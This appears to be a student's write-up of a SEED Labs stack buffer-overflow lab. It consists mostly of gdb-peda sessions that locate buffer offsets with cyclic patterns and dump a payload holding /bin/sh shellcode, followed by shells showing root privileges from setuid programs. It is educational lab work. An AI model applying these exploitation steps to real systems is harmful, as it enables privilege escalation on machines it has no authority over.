# Answer in my observation

## Task 1
- Firstly, I debug the vulnerable program `stack-L1-dbg` with `gdb-peda` to find the address of `buffer` variable and `$ebp` register.

```
[04/05/24]seed@VM:~/.../code$ gdb stack-L1-dbg
gdb-peda$ b* bof
Breakpoint 1 at 0x12ad: file stack.c, line 16.
gdb-peda$ r
Starting program: /home/seed/bof_setuid/Labsetup/code/stack-L1-dbg 
Input size: 147
[----------------------------------registers-----------------------------------]
EAX: 0xffffcba8 --> 0x0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x60 ('`')
EDX: 0xffffcf90 --> 0xf7fb4000 --> 0x1e6d6c 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffcf98 --> 0xffffd1c8 --> 0x0 
ESP: 0xffffcb8c --> 0x565563ee (<dummy_function+62>:	add    esp,0x10)
EIP: 0x565562ad (<bof>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a4 <frame_dummy+4>:	jmp    0x56556200 <register_tm_clones>
   0x565562a9 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x565562ac <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x565562ad <bof>:	endbr32 
   0x565562b1 <bof+4>:	push   ebp
   0x565562b2 <bof+5>:	mov    ebp,esp
   0x565562b4 <bof+7>:	push   ebx
   0x565562b5 <bof+8>:	sub    esp,0x74
[------------------------------------stack-------------------------------------]
0000| 0xffffcb8c --> 0x565563ee (<dummy_function+62>:	add    esp,0x10)
0004| 0xffffcb90 --> 0xffffcfb3 ('A' <repeats 112 times>, "\004\314\377\377BBBB1\300Ph//shh/bin\211\343PS\211\341\061\322\061\300\260\v̀")
0008| 0xffffcb94 --> 0x0 
0012| 0xffffcb98 --> 0x3e8 
0016| 0xffffcb9c --> 0x565563c3 (<dummy_function+19>:	add    eax,0x2bf5)
0020| 0xffffcba0 --> 0x0 
0024| 0xffffcba4 --> 0x0 
0028| 0xffffcba8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (
    str=0xffffcfb3 'A' <repeats 112 times>, "\004\314\377\377BBBB1\300Ph//shh/bin\211\343PS\211\341\061\322\061\300\260\v̀") at stack.c:16
16	{
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x60 ('`')
EDX: 0xffffcf90 --> 0xf7fb4000 --> 0x1e6d6c 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffcb88 --> 0xffffcf98 --> 0xffffd1c8 --> 0x0 
ESP: 0xffffcb10 ("1pUV\244\317\377\377\220\325\377\367\340\263\374", <incomplete sequence \367>)
EIP: 0x565562c2 (<bof+21>:	sub    esp,0x8)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562b5 <bof+8>:	sub    esp,0x74
   0x565562b8 <bof+11>:	call   0x565563f7 <__x86.get_pc_thunk.ax>
   0x565562bd <bof+16>:	add    eax,0x2cfb
=> 0x565562c2 <bof+21>:	sub    esp,0x8
   0x565562c5 <bof+24>:	push   DWORD PTR [ebp+0x8]
   0x565562c8 <bof+27>:	lea    edx,[ebp-0x6c]
   0x565562cb <bof+30>:	push   edx
   0x565562cc <bof+31>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffcb10 ("1pUV\244\317\377\377\220\325\377\367\340\263\374", <incomplete sequence \367>)
0004| 0xffffcb14 --> 0xffffcfa4 --> 0x93 
0008| 0xffffcb18 --> 0xf7ffd590 --> 0xf7fd1000 --> 0x464c457f 
0012| 0xffffcb1c --> 0xf7fcb3e0 --> 0xf7ffd990 --> 0x56555000 --> 0x464c457f 
0016| 0xffffcb20 --> 0x0 
0020| 0xffffcb24 --> 0x0 
0024| 0xffffcb28 --> 0x0 
0028| 0xffffcb2c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
20	    strcpy(buffer, str);
gdb-peda$ p $ebp
$1 = (void *) 0xffffcb88
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffcb1c
```

- However, when compiling the vulnerable program `stack-L1` with `gdb-peda`, I can only find address of `$ebp` register, it seems that the address of `$ebp` register in these files are different.

```
[04/05/24]seed@VM:~/.../code$ gdb stack-L1
[...]
gdb-peda$ p $ebp
$1 = (void *) 0xffffcb98
gdb-peda$ p &buffer
No symbol table is loaded.  Use the "file" command.
```

- It can be seen that the address of `buffer` variable is `$ebp - 0x6c`, which means we will need ```108 bytes buffer + 4 bytes padding``` to reach to address of return address.
- Because `gdb` has pushed some environment data into the stack before running the debugged program, the ACTUAL frame pointer value will be larger, so I will jump to the address larger than `$ebp + 8`.
- After testing all possible value, I see that we can jump to `$ebp + 0x6c` to get the shell as `root`.

```
[04/05/24]seed@VM:~/.../code$ ./stack-L1
Input size: 147
# id                                                                           
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
# whoami                                                                       
root
```

## Task 2
- Because I can still use `gdb`, therefore I will create 300 size pattern and find which position that in `$ebp` register.

```
[04/06/24]seed@VM:~/.../code$ gdb -q stack-L2
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from stack-L2...
(No debugging symbols found in stack-L2)
gdb-peda$ b* bof
Breakpoint 1 at 0x12ad
gdb-peda$ r
Starting program: /home/seed/bof_setuid/Labsetup/code/stack-L2 
Input size: 1
[----------------------------------registers-----------------------------------]
EAX: 0xffffcbb8 --> 0x0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x60 ('`')
EDX: 0xffffcfa0 --> 0xf7fb4000 --> 0x1e6d6c 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffcfa8 --> 0xffffd1d8 --> 0x0 
ESP: 0xffffcb9c --> 0x565563f4 (<dummy_function+62>:	add    esp,0x10)
EIP: 0x565562ad (<bof>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a4 <frame_dummy+4>:	jmp    0x56556200 <register_tm_clones>
   0x565562a9 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x565562ac <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x565562ad <bof>:	endbr32 
   0x565562b1 <bof+4>:	push   ebp
   0x565562b2 <bof+5>:	mov    ebp,esp
   0x565562b4 <bof+7>:	push   ebx
   0x565562b5 <bof+8>:	sub    esp,0xa4
[------------------------------------stack-------------------------------------]
0000| 0xffffcb9c --> 0x565563f4 (<dummy_function+62>:	add    esp,0x10)
0004| 0xffffcba0 --> 0xffffcfc3 --> 0x40a 
0008| 0xffffcba4 --> 0x0 
0012| 0xffffcba8 --> 0x3e8 
0016| 0xffffcbac --> 0x565563c9 (<dummy_function+19>:	add    eax,0x2bef)
0020| 0xffffcbb0 --> 0x0 
0024| 0xffffcbb4 --> 0x0 
0028| 0xffffcbb8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x565562ad in bof ()
gdb-peda$ pattern_create 300 badfile
Writing pattern of 300 chars to filename "badfile"
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x1 
EBX: 0x41417241 ('ArAA')
ECX: 0xffffd0e0 ("fA%5A%KA%gA%6A%")
EDX: 0xffffcc0d ("fA%5A%KA%gA%6A%")
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0x74414156 ('VAAt')
ESP: 0xffffcba0 ("AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
EIP: 0x41574141 ('AAWA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41574141
[------------------------------------stack-------------------------------------]
0000| 0xffffcba0 ("AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0004| 0xffffcba4 ("XAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0008| 0xffffcba8 ("AAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0012| 0xffffcbac ("AwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0016| 0xffffcbb0 ("ZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0020| 0xffffcbb4 ("AAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0024| 0xffffcbb8 ("AzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
0028| 0xffffcbbc ("%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41574141 in ?? ()
```

- We can see that the last value in `$EIP` register is `AAWA`. Therefore we just need to find this value in created pattern to find the final offset.

```
gdb-peda$ pattern_offset AAWA
AAWA found at offset: 172
```

- To reach the return address, we just need 172 bytes arbitrary value and 4 bytes return address to get the shell as `root`.

```
[04/06/24]seed@VM:~/.../code$ ./stack-L2
Input size: 207
# id                                                                           
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
# whoami                                                                       
root
```

## Task 7
- When running the program `a32.out` and `a64.out` with `setuid(0)`, we are running as the `root` user.

```
[04/06/24]seed@VM:~/.../shellcode$ make setuid
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
sudo chown root a32.out a64.out
sudo chmod 4755 a32.out a64.out
[04/06/24]seed@VM:~/.../shellcode$ ./a
a32.out  a64.out  
[04/06/24]seed@VM:~/.../shellcode$ ./a32.out 
# id                                                                           
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
# whoami                                                                       
root
# exit                                                                         
[04/06/24]seed@VM:~/.../shellcode$ ./a64.out 
# whoami                                                                       
root
# id                                                                           
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
# exit
```

- When running the program `a32.out` and `a64.out` without `setuid(0)`, we are running as the `seed` user.
```
[04/06/24]seed@VM:~/.../shellcode$ make all 
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
[04/06/24]seed@VM:~/.../shellcode$ ls
a32.out  a64.out  call_shellcode.c  Makefile
[04/06/24]seed@VM:~/.../shellcode$ ./a32.out 
$ id                                                                           
uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
$ whoami                                                                       
seed
$ exit                                                                         
[04/06/24]seed@VM:~/.../shellcode$ ./a64.out 
$ whoami                                                                       
seed
$ id                                                                           
uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
$ exit
```

# Task 7

- Before adding `setuid(0)`
```
[04/06/24]seed@VM:~/.../code$ ./stack-L1
Input size: 147
$ id
uid=1000(seed) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
$ whoami
seed
$ exit
```

- After adding `setuid(0)`
```
[04/06/24]seed@VM:~/.../code$ ./stack-L1
Input size: 155
# id
uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
# whoami
root
# exit
```